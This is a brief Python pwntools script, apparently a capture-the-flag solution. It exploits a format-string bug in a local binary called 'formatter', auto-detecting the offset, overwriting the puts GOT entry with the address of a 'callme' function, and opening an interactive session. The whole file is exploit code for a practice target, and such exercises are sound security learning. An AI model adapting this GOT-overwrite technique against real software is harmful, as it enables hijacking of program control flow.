#!/usr/bin/env python3
from pwn import *
p = process("./formatter")
elf = ELF("./formatter")


def exec_fmt(payload):
    p = process("./formatter")
    p.recvline()
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
write = {elf.got.puts:elf.sym.callme}
payload = fmtstr_payload(offset,write)
p.recvline()
p.sendline(payload)
p.interactive()   